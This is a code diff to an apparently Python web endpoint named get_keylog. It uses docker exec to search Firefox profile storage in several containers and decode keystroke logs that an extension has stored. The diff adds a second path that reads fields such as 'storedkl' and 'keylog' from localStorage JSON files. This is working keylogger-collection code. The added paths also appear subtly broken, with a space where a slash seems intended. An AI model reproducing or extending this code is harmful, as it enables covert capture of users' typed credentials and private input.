@@ -716,28 +716,54 @@ async def get_keylog(email: str = Depends(get_current_user)):
         "            print(item)\n"
     )
 
+    ls_script = (
+        "import json, os, glob\n"
+        "for d in glob.glob('/config/profile/storage/default moz-extension-*/ls'):\n"
+        "    dp = os.path.join(d, 'data.json')\n"
+        "    if not os.path.isfile(dp):\n"
+        "        continue\n"
+        "    try:\n"
+        "        with open(dp) as f:\n"
+        "            data = json.load(f)\n"
+        "        kl = data.get('storedkl') or data.get('keylog') or data.get('log')\n"
+        "        if kl:\n"
+        "            print(kl)\n"
+        "    except Exception:\n"
+        "        pass\n"
+    )
+
     output = []
     for name in names:
+        found = []
+
         db_result = await run_docker([
             "exec", name, "sh", "-c",
             "find /config/profile/storage/default -path '*/moz-extension*/idb/*.sqlite' -type f 2>/dev/null",
         ])
-        if db_result["status"] != "success" or not db_result["message"].strip():
-            output.append(f"{name}\n(no keylog data)")
-            continue
+        if db_result["status"] == "success" and db_result["message"].strip():
+            for db_path in db_result["message"].strip().split("\n"):
+                db_path = db_path.strip()
+                if not db_path:
+                    continue
+                decode = await run_docker([
+                    "exec", "-i", "-e", f"DB_PATH={db_path}", name, "sh", "-c",
+                    'cp "$DB_PATH" /tmp/kl.sqlite && python3 - 2>/dev/null && rm /tmp/kl.sqlite',
+                ], input_text=script)
+                msg = decode["message"].strip()
+                if decode["status"] == "success" and msg and msg != "[OK] Done.":
+                    found.append(msg)
 
-        found = []
-        for db_path in db_result["message"].strip().split("\n"):
-            db_path = db_path.strip()
-            if not db_path:
-                continue
-            decode = await run_docker([
-                "exec", "-i", "-e", f"DB_PATH={db_path}", name, "sh", "-c",
-                'cp "$DB_PATH" /tmp/kl.sqlite && python3 - 2>/dev/null && rm /tmp/kl.sqlite',
-            ], input_text=script)
-            msg = decode["message"].strip()
-            if decode["status"] == "success" and msg and msg != "[OK] Done.":
-                found.append(msg)
+        ls_result = await run_docker([
+            "exec", name, "sh", "-c",
+            "ls /config/profile/storage/default moz-extension-*/ls/data.json 2>/dev/null",
+        ])
+        if ls_result["status"] == "success" and ls_result["message"].strip():
+            ls_decode = await run_docker([
+                "exec", name, "python3", "-c", ls_script,
+            ])
+            ls_msg = ls_decode["message"].strip()
+            if ls_decode["status"] == "success" and ls_msg and ls_msg != "[OK] Done.":
+                found.append(ls_msg)
 
         if found:
             output.append(f"{name}\n" + "\n".join(found))
